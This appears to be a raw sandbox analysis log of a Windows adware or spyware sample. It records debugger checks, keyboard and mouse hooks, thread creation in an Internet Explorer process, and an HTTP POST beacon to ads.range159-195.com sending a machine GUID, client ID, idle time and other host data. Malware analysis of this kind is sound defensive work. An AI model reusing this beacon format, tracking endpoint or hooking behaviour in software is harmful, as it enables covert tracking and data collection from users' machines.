+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<check_for_debugger apifunction="IsDebuggerPresent"/>
+<load_dll filename="C:\WINDOWS\system32\uxtheme.dll" successful="1" address="&#x24;5B0F0000" end_address="&#x24;5B128000" size="229376" filename_hash="16c4d24a172bfbc67f488d6b4086b9e10f8eaf4b"/>
+<get_system_directory/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\Compatibility\iexplore.exe"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared" value="CUAS"/>
+<create_mutex name="CTF.LBES.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Compart.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Asm.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.Layouts.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<create_mutex name="CTF.TMD.MutexDefaultS-1-5-21-583907252-1708537768-842925246-500" owned="0"/>
+<open_key key="HKEY_CURRENT_USER\Keyboard Layout\Toggle"/>
+<query_value key="HKEY_CURRENT_USER\Keyboard Layout\Toggle" value="Language Hotkey"/>
+<query_value key="HKEY_CURRENT_USER\Keyboard Layout\Toggle" value="Layout Hotkey"/>
+<get_system_directory/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF" value="EnableAnchorContext"/>
+<create_mutex name="CTF.TimListCache.FMPDefaultS-1-5-21-583907252-1708537768-842925246-500MUTEX.DefaultS-1-5-21-583907252" owned="0"/>
+<set_windows_hook hookid="WH_KEYBOARD" threadid="2692" hook_address="&#x24;746B07C3" hook_module="&#x24;746A0000"/>
+<set_windows_hook hookid="WH_MOUSE" threadid="2692" hook_address="&#x24;746B04CD" hook_module="&#x24;746A0000"/>
+<create_window hwnd="&#x24;00260118" classname="OleMainThreadWndClass" windowname="OleMainThreadWndName" height="0" width="0" top="0" left="0" style="WS_DISABLED WS_OVERLAPPED WS_POPUP WS_TILED" exstyle="WS_EX_LEFT WS_EX_LTRREADING WS_EX_RIGHTSCROLLBAR"/>
+<open_key key="HKEY_CLASSES_ROOT\InternetExplorer.Application"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\InternetExplorer.Application" value="CLSID" data="&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;0002DF01-0000-0000-C000-000000000046&#x7D;" value="LocalServer32" data="&#x22;C:\Programme\Internet Explorer\iexplore.exe&#x22;"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\Ip" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\Ip" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="\\.\Ip" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<load_dll filename="C:\WINDOWS\system32\iphlpapi.dll" successful="1" address="&#x24;76D20000" end_address="&#x24;76D39000" size="102400" filename_hash="d1b9eede5a4650dc577abc73d81b948a45a36830"/>
+<get_system_directory/>
+<get_computer_name/>
+<create_mutex name="Global\AA75B351" owned="0"/>
+<get_username tokenhandle="0"/>
+<open_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dd" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<get_username tokenhandle="0"/>
+<com_create_instance inprocserver32="C:\WINDOWS\system32\ieframe.dll" clsid="&#x7B;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x7D;" interfaceid="&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;"/>
+<get_system_directory/>
+<get_file_attributes filetype="file" srcfile="C:\WINDOWS\Registration" srcfile_hash="hash_error" desiredaccess="FILE_ANY_ACCESS" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\Registration\R000000000007.clb" srcfile_hash="99fde804817f1de99c87653fda604fc37510f3da" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE"/>
+<open_file filetype="file" srcfile="C:\Programme\Internet Explorer\IEXPLORE.EXE" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS FILE_READ_ATTRIBUTES" shareaccess="FILE_SHARE_READ" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Setup"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Setup" value="IExploreLastModifiedLow"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Setup"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Setup" value="IExploreLastModifiedHigh"/>
+<load_dll filename="C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\" successful="1" address="&#x24;773A0000" end_address="&#x24;774A3000" size="1060864" filename_hash="hash_error"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\Typelib"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\TypeLib"/>
+<open_key key="HKEY_CLASSES_ROOT\CLSID\&#x7B;c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Setup\7.0"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;b722bccb-4e68-101b-a2bc-00aa00404770&#x7D;\ProxyStubClsid32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;B722BCCB-4E68-101B-A2BC-00AA00404770&#x7D;\ProxyStubClsid32"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;79eac9c4-baf9-11ce-8c82-00aa004ba90b&#x7D;\ProxyStubClsid32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;79EAC9C4-BAF9-11CE-8C82-00AA004BA90B&#x7D;\ProxyStubClsid32"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;000214E6-0000-0000-C000-000000000046&#x7D;\ProxyStubClsid32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;000214E6-0000-0000-C000-000000000046&#x7D;\ProxyStubClsid32"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;93F2F68C-1D1B-11D3-A30E-00C04F79ABD1&#x7D;\ProxyStubClsid32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;93F2F68C-1D1B-11D3-A30E-00C04F79ABD1&#x7D;\ProxyStubClsid32"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;76BB3A76" address="&#x24;76BB3000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;76BB3A76" address="&#x24;76BB3000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;76BB1EF4" address="&#x24;76BB1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READWRITE" behavior="Normal"/>
+<vm_protect targetpid="2568" wantedaddress="&#x24;76BB1EF4" address="&#x24;76BB1000" wantedsize="8" size="4096" protect="PAGE_EXECUTE_READ" behavior="Normal"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<com_get_class_object inprocserver32="C:\WINDOWS\system32\ieframe.dll" clsid="&#x7B;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x7D;" interfaceid="&#x7B;00000001-0000-0000-C000-000000000046&#x7D;"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<get_computer_name/>
+<create_thread targetpid="2568" threadid="2932" address="&#x24;77E56C7D" parameteraddress="&#x24;004AD7A8"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<create_thread targetpid="2568" threadid="2936" address="&#x24;774CE43B" parameteraddress="&#x24;00558EB0"/>
+<com_create_instance clsid="&#x7B;00000339-0000-0000-C000-000000000046&#x7D;" interfaceid="&#x7B;00000003-0000-0000-C000-000000000046&#x7D;"/>
+<open_file filetype="namedpipe" srcfile="\\.\PIPE\lsarpc" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="SECURITY_ANONYMOUS"/>
+<com_create_instance clsid="&#x7B;0000032A-0000-0000-C000-000000000046&#x7D;" interfaceid="&#x7B;00000149-0000-0000-C000-000000000046&#x7D;"/>
+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<open_key key="HKEY_LOCAL_MACHINE\System\Setup"/>
+<load_dll filename="C:\WINDOWS\system32\SXS.DLL" successful="1" address="&#x24;76970000" end_address="&#x24;76A21000" size="724992" filename_hash="c7c0702f8ee09d5d5da9b9a2995e41b15622e619"/>
+<query_value key="HKEY_CLASSES_ROOT" value="Interface\&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;\ProxyStubClsid32" data="&#x7B;00020424-0000-0000-C000-000000000046&#x7D;"/>
+<query_value key="HKEY_CLASSES_ROOT" value="Interface\&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;\Forward" data="S"/>
+<open_key key="HKEY_CLASSES_ROOT\Interface\&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;\TypeLib"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;\TypeLib" data="&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Interface\&#x7B;85CB6900-4D95-11CF-960C-0080C7F4EE85&#x7D;\TypeLib" value="Version"/>
+<open_key key="HKEY_CLASSES_ROOT\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;"/>
+<enum_keys key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\1.1"/>
+<enum_keys key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\1.1"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\1.1\0"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\1.1\0\win32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B&#x7D;\1.1\0\win32" data="C:\WINDOWS\system32\ieframe.dll"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\system32\ieframe.dll" srcfile_hash="4425a987f6efbdd7ba266d0b1475924d6dc08d0b" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_CLASSES_ROOT\TypeLib"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;\2.0"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;\2.0\0"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;\2.0\0\win32"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;\2.0\0"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TypeLib\&#x7B;00020430-0000-0000-C000-000000000046&#x7D;\2.0\0" value="win32" data="C:\WINDOWS\system32\stdole2.tlb"/>
+<open_file filetype="file" srcfile="C:\WINDOWS\system32\stdole2.tlb" srcfile_hash="a8ac987fa66d6b3c631ea9f34af303f743a4a013" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc" value="UDTAlignmentPolicy"/>
+<com_get_class_object inprocserver32="oleaut32.dll" clsid="&#x7B;00020420-0000-0000-C000-000000000046&#x7D;" interfaceid="&#x7B;D5F569D0-593B-101A-B569-08002B2DBF7A&#x7D;"/>
+<query_value key="HKEY_CLASSES_ROOT" value="Interface\&#x7B;FE4106E0-399A-11D0-A48C-00A0C90A8F39&#x7D;\ProxyStubClsid32" data="&#x7B;00020420-0000-0000-C000-000000000046&#x7D;"/>
+<open_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dddat" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<create_thread targetpid="2568" threadid="2944" address="&#x24;024A8B42" parameteraddress="&#x24;0263A530"/>
+<get_username tokenhandle="0"/>
+<create_thread targetpid="2568" threadid="2948" address="&#x24;024A8B42" parameteraddress="&#x24;02599DC8"/>
+<get_username tokenhandle="0"/>
+<open_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dd" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<sleep milliseconds="0"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\IMM"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\IMM" value="Ime File"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\msctfime.ime" successful="1" address="&#x24;33F0001" end_address="&#x24;33F0001" size="0" filename_hash="434c43fc87679a37aa054c0c18e190ccb39a4439"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\msctfime.ime" successful="1" address="&#x24;75250000" end_address="&#x24;7527E000" size="188416" filename_hash="434c43fc87679a37aa054c0c18e190ccb39a4439"/>
+<get_system_directory/>
+<create_window hwnd="&#x24;0003011E" classname="IME" windowname="Default IME" height="0" width="0" top="0" left="0" style="WS_DISABLED WS_OVERLAPPED WS_POPUP WS_TILED" exstyle="WS_EX_LEFT WS_EX_LTRREADING WS_EX_RIGHTSCROLLBAR"/>
+<open_key key="HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF"/>
+<query_value key="HKEY_CURRENT_USER\Software\Microsoft\CTF" value="Disable Thread Input Manager"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\CTF\SystemShared"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CTF\SystemShared" value="CUAS"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\msctfime.ime" successful="1" address="&#x24;75250000" end_address="&#x24;7527E000" size="188416" filename_hash="434c43fc87679a37aa054c0c18e190ccb39a4439"/>
+<create_window hwnd="&#x24;00060116" classname="ATL:004B52F8" height="2147483648" width="2147483648" top="203" left="154" style="WS_BORDER WS_CAPTION WS_DLGFRAME WS_GROUP WS_MAXIMIZEBOX WS_MINIMIZEBOX WS_OVERLAPPED WS_OVERLAPPEDWINDOW WS_SIZEBOX WS_SYSMENU WS_TABSTOP WS_THICKFRAME WS_TILED WS_TILEDWINDOW" exstyle="WS_EX_LEFT WS_EX_LTRREADING WS_EX_RIGHTSCROLLBAR WS_EX_WINDOWEDGE"/>
+<get_system_directory/>
+<get_computer_name/>
+<create_open_file filetype="file" srcfile="\Device\Tcp6" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp6" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\NetBT_Tcpip_&#x7B;5D19E473-BE30-416B-B5C7-D8A091C41D2F&#x7D;" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<get_system_time apifunction="GetLocalTime"/>
+<load_dll filename="C:\WINDOWS\system32\msidle.dll" successful="1" address="&#x24;74ED0000" end_address="&#x24;74ED5000" size="20480" filename_hash="1d00d997fb0a45e52f47caea5133b6d2b3c623e0"/>
+<open_key key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;D27CDB6E-AE6D-11cf-96B8-444553540000&#x7D;\InprocServer32"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\&#x7B;D27CDB6E-AE6D-11cf-96B8-444553540000&#x7D;\InprocServer32"/>
+<load_dll filename="C:\WINDOWS\system32\Macromed\Flash\Flash6.ocx" successful="1" address="&#x24;3130001" end_address="&#x24;3130001" size="0" filename_hash="3b4e738815aaed59d76778a00574ad50d2096fa4"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\Ws2_32.dll" successful="1" address="&#x24;71A10000" end_address="&#x24;71A27000" size="94208" filename_hash="7cf3366c68e402eb3678046fe97651a586044560"/>
+<create_socket socket="4294967295" socket_type="SOCK_DGRAM" successful="0"/>
+<create_open_file filetype="file" srcfile="\Device\RasAcd" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<get_host_by_name socket="0" remote_addr="64.34.228.126" hostname="ads.range159-195.com" buffer_len="4" successful="1"/>
+<open_key key="HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\SecurityService"/>
+<query_value key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\SecurityService" value="DefaultAuthLevel"/>
+<create_socket socket="1804" socket_type="SOCK_STREAM" successful="1"/>
+<create_thread targetpid="2568" threadid="3008" address="&#x24;719BD2C6" parameteraddress="&#x24;00564798"/>
+<connect_socket socket="1804" remote_addr="64.34.228.126" remote_port="80" successful="0" winsock_result="10035"/>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1804" buffer_len="219">
+<dump_line offset="&#x24;0000" dump="50 4F 53 54 20 2F 74 62 61 2F 70 20 48 54 54 50 " ascii="POST /tba/p HTTP"/>
+<dump_line offset="&#x24;0010" dump="2F 31 2E 31 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 " ascii="/1.1..Content-Le"/>
+<dump_line offset="&#x24;0020" dump="6E 67 74 68 3A 20 32 36 37 0D 0A 43 6F 6E 74 65 " ascii="ngth: 267..Conte"/>
+<dump_line offset="&#x24;0030" dump="6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 " ascii="nt-Type: applica"/>
+<dump_line offset="&#x24;0040" dump="74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F 72 6D 2D " ascii="tion/x-www-form-"/>
+<dump_line offset="&#x24;0050" dump="75 72 6C 65 6E 63 6F 64 65 64 0D 0A 55 73 65 72 " ascii="urlencoded..User"/>
+<dump_line offset="&#x24;0060" dump="2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F " ascii="-Agent: Mozilla/"/>
+<dump_line offset="&#x24;0070" dump="34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B " ascii="4.0 &#x28;compatible;"/>
+<dump_line offset="&#x24;0080" dump="20 4D 53 49 45 20 37 2E 30 3B 20 36 2E 30 2E 38 " ascii=" MSIE 7.0; 6.0.8"/>
+<dump_line offset="&#x24;0090" dump="38 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 " ascii="8.0; Windows NT "/>
+<dump_line offset="&#x24;00A0" dump="35 2E 31 29 0D 0A 41 63 63 65 70 74 2D 45 6E 63 " ascii="5.1&#x29;..Accept-Enc"/>
+<dump_line offset="&#x24;00B0" dump="6F 64 69 6E 67 3A 20 67 7A 69 70 0D 0A 48 6F 73 " ascii="oding: gzip..Hos"/>
+<dump_line offset="&#x24;00C0" dump="74 3A 20 61 64 73 2E 72 61 6E 67 65 31 35 39 2D " ascii="t: ads.range159-"/>
+<dump_line offset="&#x24;00D0" dump="31 39 35 2E 63 6F 6D 0D 0A 0D 0A                " ascii="195.com...."/>
+</send_socket>
+<message>OverlappedWinsockIO_Send</message>
+<send_socket socket="1804" buffer_len="267">
+<dump_line offset="&#x24;0000" dump="67 75 69 64 3D 32 39 32 33 30 34 34 32 38 35 35 " ascii="guid=29230442855"/>
+<dump_line offset="&#x24;0010" dump="39 44 38 38 43 44 37 43 31 44 46 31 39 37 33 41 " ascii="9D88CD7C1DF1973A"/>
+<dump_line offset="&#x24;0020" dump="41 38 46 43 33 33 33 34 45 26 76 65 72 73 69 6F " ascii="A8FC3334E&#x26;versio"/>
+<dump_line offset="&#x24;0030" dump="6E 3D 38 36 34 34 32 32 30 36 36 37 32 30 26 63 " ascii="n=864422066720&#x26;c"/>
+<dump_line offset="&#x24;0040" dump="6C 69 65 6E 74 69 64 3D 36 39 36 43 44 37 38 39 " ascii="lientid=696CD789"/>
+<dump_line offset="&#x24;0050" dump="37 44 45 46 37 33 38 38 34 34 33 30 26 74 69 6D " ascii="7DEF73884430&#x26;tim"/>
+<dump_line offset="&#x24;0060" dump="65 3D 41 45 35 45 37 45 44 42 41 45 33 31 46 34 " ascii="e=AE5E7EDBAE31F4"/>
+<dump_line offset="&#x24;0070" dump="26 69 64 6C 65 3D 39 32 35 30 38 39 26 6C 6F 63 " ascii="&#x26;idle=925089&#x26;loc"/>
+<dump_line offset="&#x24;0080" dump="61 6C 65 3D 46 39 34 31 32 32 39 31 33 43 32 30 " ascii="ale=F94122913C20"/>
+<dump_line offset="&#x24;0090" dump="26 73 65 73 73 69 6F 6E 3D 42 31 30 42 26 61 63 " ascii="&#x26;session=B10B&#x26;ac"/>
+<dump_line offset="&#x24;00A0" dump="74 69 76 65 57 69 6E 64 6F 77 73 3D 45 31 37 42 " ascii="tiveWindows=E17B"/>
+<dump_line offset="&#x24;00B0" dump="30 32 26 74 69 63 6B 73 42 6F 6F 74 3D 41 42 33 " ascii="02&#x26;ticksBoot=AB3"/>
+<dump_line offset="&#x24;00C0" dump="36 33 39 44 43 34 31 36 34 33 43 26 74 69 63 6B " ascii="639DC41643C&#x26;tick"/>
+<dump_line offset="&#x24;00D0" dump="73 41 6C 69 76 65 3D 33 33 36 43 41 36 34 38 39 " ascii="sAlive=336CA6489"/>
+<dump_line offset="&#x24;00E0" dump="42 39 41 35 30 26 69 6E 73 74 61 6C 6C 54 69 6D " ascii="B9A50&#x26;installTim"/>
+<dump_line offset="&#x24;00F0" dump="65 3D 30 46 30 43 32 36 26 6C 61 75 6E 63 68 43 " ascii="e=0F0C26&#x26;launchC"/>
+<trimmed_bytes count="11"/>
+</send_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1804" buffer_len="3792" successful="1">
+<dump_line offset="&#x24;0000" dump="C9 40 8B 47 A1 B5 F0 95 45 FB 2B 37 12 F1 3B 66 " ascii=".&#x40;.G....E.&#x2B;7..;f"/>
+<dump_line offset="&#x24;0010" dump="8A 15 DF CA F6 1F 1D CB 12 DC 45 9B 2F 0D 96 8E " ascii="..........E./..."/>
+<dump_line offset="&#x24;0020" dump="AB FA AA 86 6E 33 8F 51 29 75 E8 F5 46 87 75 F4 " ascii="....n3.Q&#x29;u..F.u."/>
+<dump_line offset="&#x24;0030" dump="7B 51 BF EC 75 07 AE 0B B5 85 5D 85 20 55 8E BE " ascii="&#x7B;Q..u.....]. U.."/>
+<dump_line offset="&#x24;0040" dump="BE A2 74 0A 9F 43 31 A9 6E 10 CB 00 47 AA D4 D6 " ascii="..t..C1.n...G..."/>
+<dump_line offset="&#x24;0050" dump="EE CA AA 9F E1 D5 ED 1F E9 67 1F 9D 4F 7C E1 5E " ascii=".........g..O&#x7C;.&#x5E;"/>
+<dump_line offset="&#x24;0060" dump="85 86 56 1C 97 00 CB 70 45 12 E9 B0 0D 0D AE FC " ascii="..V....pE......."/>
